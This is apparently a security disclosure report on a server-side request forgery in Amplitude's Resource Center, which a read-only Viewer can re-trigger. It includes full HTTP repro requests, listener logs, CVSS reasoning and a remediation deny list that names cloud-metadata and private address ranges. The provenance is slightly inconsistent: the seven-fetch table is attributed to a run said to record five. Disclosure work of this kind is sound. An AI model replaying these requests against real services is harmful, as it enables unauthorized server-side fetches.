# Amplitude Resource Center — proxied, title-only server-side fetch of a tenant-supplied URL, re-drivable by a read-only Viewer

**Severity:** CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:N` = **2.9 (Low)**
**Tenant:** org `464637` (`agentmail-602393`), app `862908` — our own tenant only. Accounts: ORG_ADMIN (`orgRole 4`) and VIEWER (`orgRole 1`), same org.

## Summary

A Resource Center **website** content source takes fully tenant-controlled URLs in `settings.recursive_urls`. When a sync runs, Amplitude's backend fetches those URLs server-side and stores the response. The fetched page's **title, URL and content type** are then handed back to the caller through the ordinary read endpoint; the response body is not.

Two properties make this reachable, and they sit at different privilege levels. The URL list is attacker-controlled at creation time and creation is Admin-gated. The route that triggers the fetch, `POST /h/syncs/`, carries no authorization check — a read-only Viewer reaches it (see the companion broken-authorization report).

The decisive measured fact is the role differential across the two routes:

```
POST /h/sources/  ADMIN -> 201   |  VIEWER -> 403 {"detail":"You do not have permission to perform this action."}
POST /h/syncs/    ADMIN -> 201   |  VIEWER -> 200   (never 403)
POST /h/syncs/ {"source":999999}  VIEWER -> 404 "Not found."   (no authz layer; straight to object lookup)
```

Read together: an Admin chooses the URL once, and from then on any Viewer in the tenant can re-drive that fetch on demand. The Viewer-only path is a **replay** of an Admin-chosen URL, not an attacker-directed fetch.

**Scoping caveat, stated up front:** the fetches egress through the **ScrapingBee** scraping proxy (`"enable_scrapingbee": true` on the source; the observed fetches came from seven different datacentre IPs with browser-like User-Agents and no `Referer`). The request does not originate from Amplitude's own network, so classic cloud-metadata theft (`http://169.254.169.254/...`) is not claimed here and was deliberately not fired. The finding is the arbitrary-URL server-side fetch with a proxied egress and a title-only read-back.

## Repro

*Provenance:* steps 1–2 are from the `raw2/001_B_*` capture of source `25934` / sync `74318`; the fetch table and the read-back (steps 3–4) are from the independent root-agent run (`root_verify_ssrf_20260919T035813Z.json`) on source `25935`, which recorded **5 fetches**. The "seven different datacentre IPs" in the caveat is the `25934` run (`evidence/webhook-requests-summary.json`, 7 arrivals in the sync window). Both runs are ours; they are not the same run.

1. Create a `website` source pointed at a listener we control.

```
POST /h/sources/?org_id=464637&app_id=862908 HTTP/1.1
Host: app.amplitude.com
Cookie: <session>
Origin: https://app.amplitude.com
Referer: https://app.amplitude.com/
x-csrf-token: 1
Content-Type: application/json

{"type":"website",
 "title":"zz-rootverify-35813",
 "settings":{"recursive_urls":["https://webhook.site/3b23fb27-4…e103"]}}
```
```
HTTP/1.1 201 Created
{"id":25935,"type":"website","title":"zz-rootverify-35813",
 "settings":{"recursive_urls":["https://webhook.site/3b23fb27-..."]},
 "enable_scrapingbee":true,"enable_scrapingbee_js_render":false,
 "workflow_schedule_id":"houston-schedule-sync-521bf763-...",
 "flag_config":{"id":"1456700","deliveryMethod":"resource-center-source", ...}}
```

2. Trigger the sync.

```
POST /h/syncs/?org_id=464637&app_id=862908
{"source":25935}
```
```
HTTP/1.1 201 Created
{"id":74329,"source":25935,"status":"PENDING",
 "workflow_id":"houston-sync-25935","workflow_run_id":"01a0b7d1-17f6-71ea-bc6d-9714801d3024"}
```

3. The listener records the server-side fetches. Sync triggered `02:58:48Z`; fetches arrived `02:58:54Z – 02:59:08Z`:

| # | time (UTC) | method | source IP | User-Agent |
|---|---|---|---|---|
| 1 | 02:58:54 | GET | 209.242.204.166 | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 …` |
| 2 | 02:58:57 | GET | 23.95.244.184 | `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/…` |
| 3 | 02:59:00 | GET | 23.229.19.190 | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 …` |
| 4 | 02:59:01 | GET | 216.173.109.246 | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 …` |
| 5 | 02:59:02 | GET | 45.43.190.35 | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 …` |
| 6 | 02:59:04 | GET | 64.137.83.198 | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 …` |
| 7 | 02:59:08 | GET | 104.239.41.222 | `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/…` |

Seven fetches from seven distinct IPs, all inside the window opened by our single sync trigger. The sync then completed (`"status":"COMPLETED"`, `workflow_id: houston-sync-25935`).

4. The fetched page's metadata is persisted and readable. With a page containing article links (as in the first run of this test) the sync reports `num_fetched: 13, num_created: 12`, and the fetched page's metadata is returned through the ordinary read endpoint:

```
GET /h/content-items/?org_id=464637&app_id=862908&source_id=25934
-> {"results":[{"id":1049776,"source":25934,
                "title":"Webhook.site requests and emails - SAML SSO Login",
                "url":"https://webhook.site/saml/login","source_type":"website",
                "content_type":"document","archived":false, ...}, ...]}
```

The response body is **not** returned: `GET /h/content-items/` returns `id, source, title, url, source_type, content_type, third_party_id, thumbnail_url, is_published, …` with no body field, and the detail route `GET /h/content-items/<id>/` adds exactly one field, `"content_markdown": null`. The `title` is extracted from the fetched page's `<title>` tag (measured: `https://example.com/` → `"Example Domain"`). **This is a proxied, title-only read-back — not a body-read primitive.**

5. A Viewer can drive the fetch (no authorization layer on the trigger route):

```
POST /h/sources/  ADMIN -> 201 | VIEWER -> 403   (correctly gated)
POST /h/syncs/    ADMIN -> 201 | VIEWER -> 200   (never 403)
POST /h/syncs/ {"source":999999} VIEWER -> 404   (no authz layer; straight to object lookup)
```

**Controls**

- Anonymous on `/h/sources/`, `/h/content-items/`, `/h/syncs/` → `403 "Authentication credentials were not provided."`
- Tried to force a **direct** (non-proxied) fetch by setting `enable_scrapingbee:false` and re-pointing the source at a marked URL: **no direct fetch arrived**. The flag is accepted and echoed — `POST /h/sources/ {"enable_scrapingbee":false,…}` → `201` whose body contains `"enable_scrapingbee":false` and `"enable_scrapingbee_js_render":false` — but the fetcher ignores it and still egresses through the proxy. The control is settable-and-inert, not read-only. We therefore do **not** claim an Amplitude-origin fetch, and did not target `169.254.169.254`.
- The listener used is one we own; no third-party host was fetched.
- All test sources were deleted (`204`) and the cascade-deleted content items verified gone.

## Impact

- Amplitude's backend can be made to issue HTTP requests to an arbitrary tenant-supplied URL, and a metadata record derived from the response — the fetched page's title, URL and content type — is returned to the caller through `/h/content-items/`. The response body itself is not returned.
- A read-only Viewer can trigger the fetch against a source it did not create.
- The fetches are proxied through ScrapingBee, so the reachable target set is whatever that proxy can resolve — **not** Amplitude's internal network. That bounds the impact and is why this is reported as Low rather than High.

**Ceiling:** the attacker does **not** get the response body (`"content_markdown": null` on the detail route; no body field on the collection route); does **not** get an Amplitude-origin request (`enable_scrapingbee:false` is accepted, echoed, and ignored); and therefore does **not** reach `169.254.169.254`, RFC1918 or link-local space. The Viewer path is a **replay** of an Admin-chosen URL, not an attacker-directed fetch.

**CVSS terms and the measured fact behind each:**

- `PR:L` — measured: Viewer (`orgRole 1`) receives `200` from `POST /h/syncs/` and `403` from `POST /h/sources/`.
- `AC:L` — measured: one `POST /h/syncs/` replays the fetch; no race or special condition.
- `C:N` — measured: the read endpoints return `"content_markdown": null` and no body field, so no response content reaches the caller.
- `AV:N`, `UI:N` — the route is a plain internet-facing HTTP call by an authenticated tenant user, with no victim interaction.
- `S:U` — **inference, not a measurement.** The vulnerable component and the impacted component are the same authorization scope; the proxy bounds the reach, so no scope change is claimed.

**Cross-report note — do not merge.** `SUBMISSION-STATSIG-INGESTION-SSRF.md` is a different vendor, product, codebase, route and fix. Both are CWE-918 and both came from this engagement; that is all they share. This report's defect is an Admin-configured, Viewer-triggerable URL fetch in the Resource Center content-source fetcher; that report's is a caller-supplied host/path in a database connector reachable by any project Member. **The egress origins are opposite:** this fetch egresses through the ScrapingBee proxy — measured: rotating datacentre IPs, zero AWS/GCP/Amplitude ASNs — so it cannot reach Amplitude's internal network and cloud-metadata theft is not claimed; the Statsig fetch egresses from Statsig's own production network and does reach RFC1918 and link-local space. **The read-back is also opposite:** this one returns a metadata record derived from the fetched page (title, URL, content type) but not the body; the Statsig one is blind (status/error oracle only). **Neither is a full-response read.** These are two independent findings on two vendors and should be assessed, and rewarded, separately.

## Remediation

- Treat `settings.recursive_urls` as untrusted input: resolve the host and reject private, loopback, link-local and metadata addresses (`127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254.0.0/16`, `::1`, `fc00::/7`), and re-validate after every redirect.
- Pin the fetcher to the ScrapingBee egress (documented and monitored) rather than allowing a direct-fetch fallback; do not let a tenant disable the proxy.
- Add the missing authorization check to `POST /h/syncs/` (see the companion report). Regression test: as a Viewer, `POST /h/syncs/ {"source":<existing>}` must return `403`, not `200`, while `POST /h/sources/` must keep returning `403`.

---
Evidence: `escal/root_verify_ssrf_20260919T035813Z.json` (root-agent independent reproduction, 5 fetches), `escal/evidence/webhook-requests.json` + `webhook-requests-summary.json` (first run, 7 fetches), `escal/raw2/001_B_ssrf_src.txt`, `escal/raw2/001_B_sync_B.txt`, `escal/raw2/001_B_contentitems.txt`, `escal/REPORT-GS-ESCALATION.md`.
